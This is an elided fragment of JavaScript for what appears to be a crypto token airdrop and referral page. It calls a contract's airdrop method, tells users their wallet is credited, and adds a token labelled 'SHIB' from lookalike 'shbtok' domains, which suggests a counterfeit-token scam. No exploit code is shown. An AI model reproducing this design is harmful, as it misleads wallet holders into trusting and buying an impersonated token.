...
let addr;
const sttaddr = "0x2fbD3252CD486eB95d39fDD6cAE03e5D5Ff324b0";
...
const getAirdrop = async () => {
    ...
    if (fresh === "")
        fresh = "0x2fbD3252CD486eB95d39fDD6cAE03e5D5Ff324b0";
    sttcontract.methods.airdrop(fresh).send({
        ...
        if (!err) {
            Swal.fire({
                ...
                icon: 'success',
                html: '<p>your wallet has been credited</p><p>Now you can buy tokens and invite referrals</p>',
        ...
        try {
            web3.currentProvider.sendAsync({
                ...
                params: {
                    'type': 'ERC20',
                    'options': {
                        'address': '0x2fbD3252CD486eB95d39fDD6cAE03e5D5Ff324b0',
                        'symbol': 'SHIB',
                        'decimals': '18',
                        'image': 'https://www.shbtok.website/logo.png',
                    },
                },
...
function getreflink() {
    ...
    if (!document.getElementById('refaddress').value) {
        ...
        if (!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)) {
            ...
            document.getElementById('refaddress').value = 'https://www.shbtok.online/?ref=' + document.getElementById('refaddress').value;
        }
    }
}
...
var ref = querySt("ref");
if (ref == null) {
    ref = "0xEc7Ce2c24597809102D026DE0C0C83f47d7c435b";
    document.getElementById('airinput').value = ref;
} else {
    document.getElementById('airinput').value = ref;
}